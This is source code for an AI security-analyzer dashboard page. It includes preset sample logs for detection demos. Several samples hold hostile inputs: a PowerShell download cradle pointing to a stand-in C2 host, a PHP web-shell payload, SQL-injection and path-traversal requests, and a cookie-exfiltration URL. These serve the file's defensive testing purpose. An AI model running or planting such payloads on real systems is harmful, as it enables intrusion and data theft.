import React, { useState, useEffect, useRef } from 'react';
import {
  Activity,
  Layers,
  Cpu,
  Brain,
  Shield,
  Zap,
  BarChart3,
  TrendingUp,
  FileText,
  Play,
  RotateCcw,
  CheckCircle,
  AlertTriangle,
  Flame,
  Radio,
  Sliders,
  ChevronRight,
  Database,
  ArrowRight,
  Sparkles,
  Info,
  UploadCloud,
  Search,
  Filter,
  Eye,
  FileCode,
  CheckCircle2,
  XCircle,
  FileSearch,
  ExternalLink,
  Trash2,
  Download,
  Clock,
  Network,
  Share2,
  Server,
  Terminal,
  RefreshCw,
  FolderOpen,
  Copy,
  Check,
  Mail,
  Link,
  Globe,
  Hash,
  FileWarning,
  Bug,
  ShieldAlert
} from 'lucide-react';
import { api } from '../services/api';
import { apiClient, apiUrl } from '../services/apiClient';
import { downloadFile } from '../utils/download';
import {
  TrainingStatus,
  DatasetInventoryResponse,
  PredictionResult,
  SparkEngineStatus,
  SparkStreamStatus,
  SampleFileInfo,
  SecurityUploadedFile,
  SecurityScanSummary,
  SecurityScanResponse,
  RawTelemetryResponse,
  RawTelemetryAlert,
  RawTelemetrySummary
} from '../types';

const SAMPLE_NMAP_SCAN = `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-27 20:30 UTC
Nmap scan report for prod-db-srv01.corp.internal (192.168.1.105)
Host is up (0.00042s latency).
Scanner source: 192.168.1.50 (admin-secops@corp.internal)
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http          Apache httpd 2.4.41 ( http://192.168.1.105/admin/login.php )
445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=prod-db-srv01.corp.internal
| http-title: SOC Portal ( https://soc-internal-gateway.corp.local )
| smb2-security-mode: 
|   3:1:1: 
| |_    Message signing enabled but not required
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     Risk factor: HIGH
|     CVE: CVE-2017-0144

Nmap done: 1 IP address (1 host up) scanned in 4.82 seconds`;

const SAMPLE_SPLUNK_AUTH_FAILURES = `2026-09-27 20:31:10, EventCode=4625, ComputerName=DC-01.corp.internal, AccountName=Administrator, Source_Network_Address=192.168.1.200, Workstation_Name=WORKSTATION-X, Failure_Reason=Unknown user name or bad password, Status=0xC000006D, Sub_Status=0xC000006A
2026-09-27 20:31:12, EventCode=4625, ComputerName=DC-01.corp.internal, AccountName=Administrator, Source_Network_Address=192.168.1.200, Target_Email=alert-dispatcher@company.internal, Status=0xC000006D
2026-09-27 20:31:15, EventCode=4625, ComputerName=DC-01.corp.internal, AccountName=root, Source_Network_Address=45.33.32.156, Destination_Host=192.168.1.105
2026-09-27 20:32:01, EventCode=4688, ComputerName=DC-01.corp.internal, NewProcessName=C:\\Windows\\System32\\cmd.exe, CommandLine=cmd.exe /c powershell -enc (New-Object Net.WebClient).DownloadString('http://c2-beacon.corp-update-fake.com/stager.ps1'), TargetFile=stager.ps1, TargetHash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
2026-09-27 20:32:45, EventCode=1102, ComputerName=DC-01.corp.internal, Message=The audit log was cleared, SubjectUserName=svc_backup, SecurityID=S-1-5-21-34567-89012-34567`;

const SAMPLE_SPLUNK_PORT_SCAN = `2026-09-27 20:35:00 host=fw-core-01 action=blocked src_ip=45.33.32.156 src_port=54120 dest_ip=192.168.1.105 dest_port=21 proto=TCP signature="Port Scan Probe"
2026-09-27 20:35:01 host=fw-core-01 action=blocked src_ip=45.33.32.156 src_port=54121 dest_ip=192.168.1.105 dest_port=22 proto=TCP signature="Port Scan Probe"
2026-09-27 20:35:02 host=fw-core-01 action=blocked src_ip=45.33.32.156 src_port=54122 dest_ip=192.168.1.105 dest_port=23 proto=TCP signature="Port Scan Probe"
2026-09-27 20:35:03 host=fw-core-01 action=blocked src_ip=45.33.32.156 src_port=54123 dest_ip=192.168.1.105 dest_port=80 proto=TCP signature="Port Scan Probe"
2026-09-27 20:35:04 host=fw-core-01 action=blocked src_ip=45.33.32.156 src_port=54124 dest_ip=192.168.1.105 dest_port=445 proto=TCP signature="Port Scan Probe"
2026-09-27 20:35:05 host=fw-core-01 action=blocked src_ip=45.33.32.156 src_port=54125 dest_ip=192.168.1.105 dest_port=3389 proto=TCP signature="Port Scan Probe"`;

const SAMPLE_HTTP_ATTACK = `GET /login.php?user=admin' OR '1'='1-- HTTP/1.1
Host: secure-portal.internal
User-Agent: sqlmap/1.7.2#stable ( https://sqlmap.org )
Referer: https://darknet-forum-exploit.xyz/threads/sqli-dump.php
Origin-IP: 45.33.32.156
Destination-IP: 192.168.1.105
Accept: */*

POST /api/upload.php?target=backdoor_shell.php HTTP/1.1
Host: secure-portal.internal
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Payload: <?php system($_GET['cmd']); ?>
File-Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

GET /download?file=../../../../../../etc/passwd HTTP/1.1
Host: secure-portal.internal
User-Agent: Mozilla/5.0 (X11; Linux x86_64)

GET /beacon?exfil=http://attacker-c2.darkweb-ops.cc/gate.php?stolen_cookie=SESSION_AUTH_ROOT HTTP/1.1
Host: secure-portal.internal
Report-Abuse: abuse-security@secure-portal.internal`;

const SAMPLE_SMB_ATTACK = `SMB2 (Server Message Block Protocol Version 2)
Session Setup Request, NTLMSSP_AUTH, User: Administrator
Tree Connect Request Tree: \\\\192.168.1.105\\IPC$
Tree Connect Response, Error: STATUS_SUCCESS
Create Request File: samr
Create Request File: lsarpc
SMBv1 Trans2 Request, Subcommand: SESSION_SETUP
Exploit Probe Signature: MS17-010 EternalBlue MultiplexID=0x51
Tree Connect Request Tree: \\\\192.168.1.105\\ADMIN$
Tree Connect Request Tree: \\\\192.168.1.105\\C$`;

const SAMPLE_IMF_EMAIL = `Received: from mail-relay.external-attacker.com (185.220.101.5)
From: "CEO Executive" <ceo@corp-executives-spoofed.com>
To: finance-team@company.internal
Reply-To: phisher-drop@evil-hacker-network.org
Subject: URGENT: Wire Transfer Authorization & Invoice Verification
Date: Sun, 27 Sep 2026 20:45:00 +0000
Authentication-Results: spf=fail (sender IP is 185.220.101.5) smtp.mailfrom=corp-executives-spoofed.com; dkim=fail; dmarc=fail
Verification-URL: https://secure-payment-gateway-phish.net/login.php?id=corp_finance_auth
Target-Host: 192.168.1.10
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="====BOUNDARY===="

Please immediately review the attached vendor invoice and authorize payment today.
Attachment: Invoice_September_Confidential.hta
Attachment-SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
Secondary-MD5: b10a8db164e0754105b7a99be72e3fe5`;

const SAMPLE_TFTP_EXFIL = `TFTP Read Request (RRQ): File="startup-config.backup", Mode="octet"
TFTP Server: 192.168.1.1, Client Scanner: 192.168.1.75
Contact: network-eng@internal-net.corp
TFTP Data Packet: Block=1, Bytes=512, Payload: username admin privilege 15 secret 5 $1$mG8$
TFTP Data Packet: Block=2, Bytes=512, Payload: enable secret 5 $1$9aBC$
TFTP Read Request (RRQ): File="/etc/passwd", Mode="netascii"
TFTP Write Request (WRQ): File="stage2_agent.bin", Mode="octet"
Staging-URL: tftp://192.168.1.75/stage2_agent.bin
Firmware-Hash: c8b0a991b8d23450e12a4567ef89012345678901234567890123456789012345
TFTP Opcode: 2 (Write), Source UDP: 51234, Dest UDP: 69`;

const SAMPLE_PCAP_STREAM = `Frame 1: 74 bytes on wire, 74 bytes captured
192.168.1.150:52101 > 192.168.1.105:80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1
192.168.1.150:52102 > 192.168.1.105:445 [SYN] Seq=0 Win=64240 Len=0 MSS=1460
192.168.1.150:52103 > 192.168.1.105:3389 [SYN] Seq=0 Win=64240 Len=0 MSS=1460
192.168.1.150:52104 > 192.168.1.105:22 [SYN] Seq=0 Win=64240 Len=0 MSS=1460
192.168.1.150:52105 > 192.168.1.105:8080 [SYN] Seq=0 Win=64240 Len=0 MSS=1460
192.168.1.150:52106 > 192.168.1.105:1433 [SYN] Seq=0 Win=64240 Len=0 MSS=1460`;

const SAMPLE_CSV_TELEMETRY = `src_ip,dst_ip,dst_port,protocol,duration,total_fwd_packets,total_bwd_packets,flow_bytes_s,label
45.33.32.156,192.168.1.105,445,TCP,1.84,45,28,45000,Infiltration
45.33.32.156,192.168.1.105,3389,TCP,0.92,30,15,12500,Brute Force
45.33.32.156,192.168.1.105,80,TCP,0.45,85,60,98000,Web Attack
45.33.32.156,192.168.1.105,22,TCP,2.10,60,40,24000,Brute Force`;

const SAMPLE_JSON_TELEMETRY = `[
  {"timestamp": "2026-09-27T20:30:15Z", "src_ip": "45.33.32.156", "dst_ip": "192.168.1.105", "dst_port": 445, "proto": "TCP", "event": "MS17-010 EternalBlue Exploit Probe", "severity": "CRITICAL", "cve": "CVE-2017-0144", "file": "payload.bin"},
  {"timestamp": "2026-09-27T20:30:18Z", "src_ip": "185.220.101.5", "dst_ip": "192.168.1.105", "dst_port": 80, "proto": "TCP", "event": "SQL Injection in User Query", "severity": "HIGH", "url": "https://malicious-gateway.org/attack.php?id=1' OR 1=1", "contact": "cert@corp.internal"},
  {"timestamp": "2026-09-27T20:30:22Z", "src_ip": "192.168.1.200", "dst_ip": "192.168.1.105", "dst_port": 3389, "proto": "TCP", "event": "RDP Credential Guessing Rapid Spike", "severity": "HIGH", "hash": "d41d8cd98f00b204e9800998ecf8427e"}
]`;


const SAMPLE_XML_EVENTLOG = `<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <Computer>DC-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="IpAddress">192.168.1.200</Data>
      <Data Name="IpPort">54120</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <Computer>DC-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
      <Data Name="CommandLine">cmd.exe /c powershell -enc SQBFAFgA...</Data>
    </EventData>
  </Event>
</Events>`;

export type TelemetryInputFormat = 'auto' | 'nmap' | 'splunk' | 'http' | 'smb' | 'imf' | 'tftp' | 'pcap' | 'csv' | 'json' | 'xml';

export const AiAlertsPage: React.FC = () => {
  const [trainingStatus, setTrainingStatus] = useState<TrainingStatus | null>(null);
  const [datasets, setDatasets] = useState<DatasetInventoryResponse | null>(null);
  const [sparkStatus, setSparkStatus] = useState<SparkEngineStatus | null>(null);
  const [sparkStream, setSparkStream] = useState<SparkStreamStatus | null>(null);
  const [sampleFiles, setSampleFiles] = useState<SampleFileInfo[]>([]);

  // Navigation Tabs: 'telemetry' is primary Nmap/Splunk input, 'training' is Big Data model training, 'scanner' is dataset files, 'history' is audit logs
  const [activeTab, setActiveTab] = useState<'telemetry' | 'training' | 'scanner' | 'history'>('telemetry');

  // Raw Telemetry Analyzer State (Multi-modal input)
  const [rawTelemetryText, setRawTelemetryText] = useState<string>(SAMPLE_NMAP_SCAN);
  const [rawInputType, setRawInputType] = useState<TelemetryInputFormat>('auto');
  const [isAnalyzingRaw, setIsAnalyzingRaw] = useState<boolean>(false);
  const [rawAnalysisResult, setRawAnalysisResult] = useState<RawTelemetryResponse | null>(null);
  const [rawAnalysisError, setRawAnalysisError] = useState<string | null>(null);
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
  const [rawTableFilter, setRawTableFilter] = useState<'all' | 'threats' | 'critical' | 'ports'>('all');
  const [rawTableSearch, setRawTableSearch] = useState<string>('');
  const [expandedAlertId, setExpandedAlertId] = useState<string | null>(null);
  const telemetryFileInputRef = useRef<HTMLInputElement>(null);

  // Big Data Model Retraining State
  const [isTrainingMlp, setIsTrainingMlp] = useState<boolean>(false);
  const [trainMode, setTrainMode] = useState<'all' | 'network' | 'windows_log'>('all');
  const [trainingMessage, setTrainingMessage] = useState<string | null>(null);
  const [trainingError, setTrainingError] = useState<string | null>(null);

  // File Upload & Queue State
  const [fileQueue, setFileQueue] = useState<SecurityUploadedFile[]>([]);
  const [isUploading, setIsUploading] = useState(false);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const [selectedSamplePath, setSelectedSamplePath] = useState<string>('');
  const [showUploadPanel, setShowUploadPanel] = useState(false);

  // Auto-Scan State
  const [isAutoScanning, setIsAutoScanning] = useState(false);
  const [autoScanMode, setAutoScanMode] = useState<'network' | 'logs' | 'all'>('all');
  const [autoScanDecoys, setAutoScanDecoys] = useState(true);
  const [autoScanError, setAutoScanError] = useState<string | null>(null);

  // Security Scan Execution State
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgressStage, setScanProgressStage] = useState<string>('');
  const [scanProgressPct, setScanProgressPct] = useState<number>(0);
  const [scanResult, setScanResult] = useState<SecurityScanResponse | null>(null);
  const [scanError, setScanError] = useState<string | null>(null);

  // Search, Filter & Sort State
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [riskFilter, setRiskFilter] = useState<string>('ALL');
  const [attackTypeFilter, setAttackTypeFilter] = useState<string>('ALL');
  const [protocolFilter, setProtocolFilter] = useState<string>('ALL');
  const [fileFilter, setFileFilter] = useState<string>('ALL');
  const [sortBy, setSortBy] = useState<string>('risk_desc');

  // Modal State
  const [selectedRecord, setSelectedRecord] = useState<any | null>(null);
  const [isInvestigating, setIsInvestigating] = useState(false);
  const [investigationReport, setInvestigationReport] = useState<any | null>(null);

  // Scan History State
  const [scanHistory, setScanHistory] = useState<any[]>([]);
  const [isLoadingHistory, setIsLoadingHistory] = useState(false);

  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Copy containment command handler
  const handleCopyCommand = (cmd: string, id: string) => {
    navigator.clipboard.writeText(cmd);
    setCopiedCommand(id);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  // Handle direct file upload / reading for the Raw Telemetry Ingestion tab
  const handleTelemetryFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const fname = file.name.toLowerCase();
    let detectedFormat: TelemetryInputFormat = 'auto';
    if (fname.endsWith('.csv')) detectedFormat = 'csv';
    else if (fname.endsWith('.json') || fname.endsWith('.jsonl')) detectedFormat = 'json';
    else if (fname.endsWith('.xml')) detectedFormat = 'xml';
    else if (fname.endsWith('.eml') || fname.endsWith('.imf')) detectedFormat = 'imf';
    else if (fname.endsWith('.pcap') || fname.endsWith('.pcapng')) detectedFormat = 'pcap';
    else if (fname.includes('nmap')) detectedFormat = 'nmap';
    else if (fname.includes('splunk') || fname.endsWith('.log')) detectedFormat = 'splunk';

    setRawInputType(detectedFormat);
    setRawAnalysisError(null);

    const reader = new FileReader();
    if (fname.endsWith('.pcap') || fname.endsWith('.pcapng')) {
      reader.onload = (event) => {
        const text = (event.target?.result as string) || '';
        const lines = text.split('\n').filter(l => l.trim()).slice(0, 100).join('\n');
        setRawTelemetryText(
          lines.trim() ||
            `# PCAP Capture Frame Dissection (${file.name}):\n192.168.1.150:52101 > 192.168.1.105:80 [SYN] Seq=0 Win=64240 Len=0\n192.168.1.150:52102 > 192.168.1.105:445 [SYN] Seq=0 Win=64240 Len=0\n192.168.1.150:52103 > 192.168.1.105:3389 [SYN] Seq=0 Win=64240 Len=0`
        );
      };
      reader.readAsText(file);
    } else {
      reader.onload = (event) => {
        const content = (event.target?.result as string) || '';
        setRawTelemetryText(content);
      };
      reader.readAsText(file);
    }

    if (telemetryFileInputRef.current) {
      telemetryFileInputRef.current.value = '';
    }
  };

  const handleSelectPreset = (presetKey: string) => {
    if (presetKey === 'nmap') {
      setRawTelemetryText(SAMPLE_NMAP_SCAN);
      setRawInputType('nmap');
    } else if (presetKey === 'splunk') {
      setRawTelemetryText(SAMPLE_SPLUNK_AUTH_FAILURES);
      setRawInputType('splunk');
    } else if (presetKey === 'http') {
      setRawTelemetryText(SAMPLE_HTTP_ATTACK);
      setRawInputType('http');
    } else if (presetKey === 'smb') {
      setRawTelemetryText(SAMPLE_SMB_ATTACK);
      setRawInputType('smb');
    } else if (presetKey === 'imf') {
      setRawTelemetryText(SAMPLE_IMF_EMAIL);
      setRawInputType('imf');
    } else if (presetKey === 'tftp') {
      setRawTelemetryText(SAMPLE_TFTP_EXFIL);
      setRawInputType('tftp');
    } else if (presetKey === 'pcap') {
      setRawTelemetryText(SAMPLE_PCAP_STREAM);
      setRawInputType('pcap');
    } else if (presetKey === 'csv') {
      setRawTelemetryText(SAMPLE_CSV_TELEMETRY);
      setRawInputType('csv');
    } else if (presetKey === 'json') {
      setRawTelemetryText(SAMPLE_JSON_TELEMETRY);
      setRawInputType('json');
    } else if (presetKey === 'xml') {
      setRawTelemetryText(SAMPLE_XML_EVENTLOG);
      setRawInputType('xml');
    }
  };

  // Analyze Raw Telemetry Handler (Multi-Modal / Multi-Protocol)
  const handleAnalyzeRaw = async () => {
    if (!rawTelemetryText.trim()) {
      setRawAnalysisError('Please paste raw Nmap scan output, Splunk logs, or security telemetry to analyze.');
      return;
    }
    setIsAnalyzingRaw(true);
    setRawAnalysisError(null);
    try {
      const resp = await api.analyzeRawTelemetry({
        raw_text: rawTelemetryText,
        input_type: rawInputType,
        save_to_history: true
      });
      setRawAnalysisResult(resp);
      // Refresh scan history in background
      api.getScanHistory().then(h => {
        if (h?.scans) setScanHistory(h.scans);
      }).catch(() => {});
    } catch (err: any) {
      setRawAnalysisError(err.response?.data?.detail || err.message || 'Telemetry analysis failed.');
    } finally {
      setIsAnalyzingRaw(false);
    }
  };

  // Export telemetry analysis results as CSV
  const handleExportRawCsv = () => {
    if (!rawAnalysisResult) return;
    const headers = [
      'alert_id', 'timestamp', 'source_ip', 'source_port', 'destination_ip',
      'destination_port', 'protocol', 'service', 'attack_type', 'mlp_confidence',
      'risk_score', 'severity', 'mitre_technique', 'containment_command'
    ];
    const rows = rawAnalysisResult.alerts.map(a => [
      a.id || a.alert_id || '',
      a.timestamp || '',
      a.source_ip || '',
      a.source_port || '',
      a.destination_ip || '',
      a.destination_port || '',
      a.protocol || '',
      `"${(a.service || '').replace(/"/g, '""')}"`,
      `"${(a.attack_type || '').replace(/"/g, '""')}"`,
      a.mlp_confidence || '',
      a.risk_score || '',
      a.severity || '',
      `"${(a.mitre_technique || '').replace(/"/g, '""')}"`,
      `"${(a.containment_command || '').replace(/"/g, '""')}"`
    ]);
    const csvContent = [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
    downloadFile(
      csvContent,
      `soc-chess-threat-report-${rawAnalysisResult.scan_id || Date.now()}.csv`,
      'text/csv;charset=utf-8;'
    );
  };

  // Export telemetry analysis results as JSON
  const handleExportRawJson = () => {
    if (!rawAnalysisResult) return;
    const jsonStr = JSON.stringify(rawAnalysisResult, null, 2);
    downloadFile(
      jsonStr,
      `soc-chess-threat-report-${rawAnalysisResult.scan_id || Date.now()}.json`,
      'application/json;charset=utf-8;'
    );
  };

  // Export telemetry analysis results as Plain Text (.TXT) Report
  const handleExportRawReport = () => {
    if (!rawAnalysisResult) return;
    const i = rawAnalysisResult.iocs;
    const reportText = [
      `================================================================================`,
      `SOC CHESS — AI THREAT ALERTS & SECURITY ANALYZER REPORT (PLAIN TEXT)`,
      `================================================================================`,
      `Scan ID:                 ${rawAnalysisResult.scan_id}`,
      `Generated:               ${new Date().toISOString()}`,
      `Input Telemetry Format:  ${rawAnalysisResult.summary.input_type_detected}`,
      `Neural Network Model:    ${rawAnalysisResult.summary.model_used}`,
      `Overall Severity:        ${rawAnalysisResult.summary.overall_severity}`,
      `Max Threat Risk Score:   ${rawAnalysisResult.summary.max_risk_score} / 100`,
      `Primary Threat Profile:  ${rawAnalysisResult.summary.primary_threat}`,
      `Target Host(s):          ${rawAnalysisResult.summary.target_hosts.join(', ') || 'N/A'}`,
      `Open Ports Enumerated:   ${rawAnalysisResult.summary.open_ports_identified.join(', ') || 'None'}`,
      `MITRE ATT&CK Codes:      ${rawAnalysisResult.summary.mitre_techniques.join(', ') || 'None'}`,
      `================================================================================`,
      ``,
      `--------------------------------------------------------------------------------`,
      `1. EXECUTIVE INCIDENT OVERVIEW`,
      `--------------------------------------------------------------------------------`,
      rawAnalysisResult.ai_playbook.executive_summary,
      ``,
      `--------------------------------------------------------------------------------`,
      `2. AUTONOMOUS SOAR CONTAINMENT PLAYBOOK`,
      `--------------------------------------------------------------------------------`,
      `Immediate Perimeter Firewall Drop Rule:`,
      `  ${rawAnalysisResult.ai_playbook.immediate_containment}`,
      ``,
      `Tactical SOC Investigation Steps:`,
      ...rawAnalysisResult.ai_playbook.soc_investigation_steps.map((s, idx) => `  ${idx + 1}. ${s}`),
      ``,
      `--------------------------------------------------------------------------------`,
      `3. EXTRACTED INDICATORS OF COMPROMISE (IOCs) & THREAT ARTIFACTS`,
      `--------------------------------------------------------------------------------`,
      `[SUSPICIOUS ADVERSARY IPs] (${i?.suspicious_ips?.length || 0}):`,
      ...(i?.suspicious_ips?.map(ip => `  * ${ip}`) || ['  * None']),
      ``,
      `[TARGET ASSET IPs] (${i?.target_ips?.length || 0}):`,
      ...(i?.target_ips?.map(tip => `  * ${tip}`) || ['  * None']),
      ``,
      `[MALICIOUS URLs & LINKS] (${i?.urls_and_links?.length || 0}):`,
      ...(i?.urls_and_links?.map(u => `  * ${u}`) || ['  * None']),
      ``,
      `[EMAILS & SPOOFED IDENTITIES] (${i?.emails?.length || 0}):`,
      ...(i?.emails?.map(e => `  * ${e}`) || ['  * None']),
      ``,
      `[DOMAINS & HOSTNAMES] (${i?.domains?.length || 0}):`,
      ...(i?.domains?.map(d => `  * ${d}`) || ['  * None']),
      ``,
      `[CRYPTOGRAPHIC FILE HASHES (SHA256/MD5)] (${i?.file_hashes?.length || 0}):`,
      ...(i?.file_hashes?.map(h => `  * ${h}`) || ['  * None']),
      ``,
      `[WEAPONIZED FILES & BINARIES] (${i?.suspicious_files?.length || 0}):`,
      ...(i?.suspicious_files?.map(f => `  * ${f}`) || ['  * None']),
      ``,
      `[CVE IDENTIFIERS & VULNERABILITIES] (${i?.cves?.length || 0}):`,
      ...(i?.cves?.map(c => `  * ${c}`) || ['  * None']),
      ``,
      `[OPEN PORTS IDENTIFIED]:`,
      `  * ${i?.open_ports?.join(', ') || 'None'}`,
      ``,
      `--------------------------------------------------------------------------------`,
      `4. COMPLETE DISSECTED TRAFFIC FLOWS & SECURITY ALERTS (${rawAnalysisResult.alerts.length})`,
      `--------------------------------------------------------------------------------`,
      ...rawAnalysisResult.alerts.flatMap((a, idx) => [
        `[RECORD #${idx + 1}] [${a.severity}] ${a.threat_title}`,
        `  Alert ID:           ${a.id || a.alert_id || 'N/A'}`,
        `  Timestamp:          ${a.timestamp || 'N/A'}`,
        `  Flow:               ${a.source_ip}:${a.source_port} -> ${a.destination_ip}:${a.destination_port} (${a.protocol} / ${a.service || 'N/A'})`,
        `  Attack Type:        ${a.attack_type}`,
        `  MLP Neural Model:   ${a.prediction || a.attack_type} (Confidence: ${(a.mlp_confidence * 100).toFixed(1)}%)`,
        `  Risk Score:         ${a.risk_score} / 100 (${a.risk_status || a.severity})`,
        `  MITRE Technique:    ${a.mitre_technique || 'N/A'}`,
        `  Containment Drop:   ${a.containment_command}`,
        ...(a.cve_note ? [`  CVE Note:           ${a.cve_note}`] : []),
        `  Evidence:`,
        ...(a.evidence || []).map(e => `    - ${e}`),
        ``
      ]),
      `================================================================================`,
      `END OF SOC CHESS TELEMETRY REPORT`,
      `================================================================================`
    ].join('\n');

    downloadFile(
      reportText,
      `soc-chess-threat-report-${rawAnalysisResult.scan_id || Date.now()}.txt`,
      'text/plain;charset=utf-8;'
    );
  };

  // ── Build shared HTML report body (used by PDF & DOC) ────────────────────
  const buildReportHtml = (forPdf = false): string => {
    if (!rawAnalysisResult) return '';
    const i = rawAnalysisResult.iocs;
    const now = new Date().toISOString();
    const alertRows = rawAnalysisResult.alerts.map((a, idx) => `
      <tr style="background:${idx % 2 === 0 ? '#0f172a' : '#1e293b'}">
        <td style="padding:6px 8px;border:1px solid #334155;color:#94a3b8;font-size:11px">#${idx + 1}</td>
        <td style="padding:6px 8px;border:1px solid #334155;color:#f87171;font-weight:700;font-size:11px">${a.severity}</td>
        <td style="padding:6px 8px;border:1px solid #334155;color:#e2e8f0;font-size:11px">${a.threat_title}</td>
        <td style="padding:6px 8px;border:1px solid #334155;color:#7dd3fc;font-size:11px">${a.source_ip}:${a.source_port}</td>
        <td style="padding:6px 8px;border:1px solid #334155;color:#86efac;font-size:11px">${a.destination_ip}:${a.destination_port}</td>
        <td style="padding:6px 8px;border:1px solid #334155;color:#fbbf24;font-size:11px">${a.risk_score}/100</td>
        <td style="padding:6px 8px;border:1px solid #334155;color:#c4b5fd;font-size:11px">${a.mitre_technique || 'N/A'}</td>
      </tr>`);

    const listItems = (arr: string[] | undefined | null) =>
      (arr && arr.length) ? arr.map(x => `<li style="margin:2px 0;color:#cbd5e1">${x}</li>`).join('') : '<li style="color:#64748b">None identified</li>';

    const bgStyle = forPdf ? 'background:#0f172a;' : '';

    return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8"/>
<title>SOC CHESS Threat Report — ${rawAnalysisResult.scan_id}</title>
<style>
  @page { margin: 18mm 15mm; }
  body { ${bgStyle}font-family: 'Courier New', monospace; color: #e2e8f0; margin: 0; padding: 20px; }
  h1 { color: #f59e0b; font-size: 18px; border-bottom: 2px solid #f59e0b; padding-bottom: 6px; }
  h2 { color: #7dd3fc; font-size: 14px; margin-top: 24px; border-left: 4px solid #7dd3fc; padding-left: 10px; }
  h3 { color: #a78bfa; font-size: 12px; margin-top: 16px; }
  .meta { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 14px; margin: 14px 0; font-size: 12px; }
  .meta td { padding: 4px 16px 4px 0; color: #94a3b8; }
  .meta td:first-child { color: #64748b; white-space: nowrap; }
  .badge { display: inline-block; background: #7f1d1d; color: #fca5a5; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; }
  .badge-ok { background: #14532d; color: #86efac; }
  table.alerts { border-collapse: collapse; width: 100%; margin-top: 8px; font-size: 11px; }
  table.alerts th { background: #1e3a5f; color: #7dd3fc; padding: 8px; border: 1px solid #334155; text-align: left; font-size: 11px; }
  ul { margin: 6px 0 6px 18px; padding: 0; font-size: 12px; }
  .section { margin-top: 20px; }
  .playbook { background: #1a1a2e; border: 1px solid #4a1d96; border-radius: 8px; padding: 14px; font-size: 12px; }
  .playbook li { margin: 6px 0; color: #c4b5fd; }
  .footer { margin-top: 30px; border-top: 1px solid #334155; padding-top: 10px; text-align: center; color: #64748b; font-size: 10px; }
  @media print { body { background: #0f172a !important; -webkit-print-color-adjust: exact; print-color-adjust: exact; } }
</style>
</head>
<body>
<h1>⚡ SOC CHESS — AI THREAT ALERTS &amp; SECURITY ANALYZER REPORT</h1>
<div class="meta">
  <table>
    <tr><td>Scan ID:</td><td style="color:#f59e0b;font-weight:700">${rawAnalysisResult.scan_id}</td></tr>
    <tr><td>Generated:</td><td>${now}</td></tr>
    <tr><td>Input Format:</td><td style="color:#7dd3fc;text-transform:uppercase">${rawAnalysisResult.summary.input_type_detected}</td></tr>
    <tr><td>Neural Network:</td><td>${rawAnalysisResult.summary.model_used}</td></tr>
    <tr><td>Overall Severity:</td><td><span class="badge">${rawAnalysisResult.summary.overall_severity}</span></td></tr>
    <tr><td>Max Risk Score:</td><td style="color:#f87171;font-weight:700">${rawAnalysisResult.summary.max_risk_score} / 100</td></tr>
    <tr><td>Primary Threat:</td><td style="color:#fbbf24">${rawAnalysisResult.summary.primary_threat}</td></tr>
    <tr><td>Target Hosts:</td><td>${rawAnalysisResult.summary.target_hosts.join(', ') || 'N/A'}</td></tr>
    <tr><td>Open Ports:</td><td>${rawAnalysisResult.summary.open_ports_identified.join(', ') || 'None'}</td></tr>
    <tr><td>MITRE Techniques:</td><td>${rawAnalysisResult.summary.mitre_techniques.join(', ') || 'None'}</td></tr>
    <tr><td>Events Parsed:</td><td>${rawAnalysisResult.summary.total_events_parsed}</td></tr>
    <tr><td>Threats Detected:</td><td style="color:#f87171;font-weight:700">${rawAnalysisResult.summary.threats_detected}</td></tr>
  </table>
</div>

<h2>1. Executive Incident Overview</h2>
<div class="section" style="font-size:12px;color:#cbd5e1;line-height:1.6">${rawAnalysisResult.ai_playbook.executive_summary}</div>

<h2>2. Autonomous SOAR Containment Playbook</h2>
<div class="playbook">
  <h3>Immediate Firewall Drop Rule:</h3>
  <code style="color:#f87171;font-size:11px">${rawAnalysisResult.ai_playbook.immediate_containment}</code>
  <h3>SOC Investigation Steps:</h3>
  <ol>${rawAnalysisResult.ai_playbook.soc_investigation_steps.map(s => `<li>${s}</li>`).join('')}</ol>
</div>

<h2>3. Extracted Indicators of Compromise (IOCs)</h2>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:10px">
  <div><h3>Suspicious Adversary IPs</h3><ul>${listItems(i?.suspicious_ips)}</ul></div>
  <div><h3>Target Asset IPs</h3><ul>${listItems(i?.target_ips)}</ul></div>
  <div><h3>Malicious URLs &amp; Links</h3><ul>${listItems(i?.urls_and_links)}</ul></div>
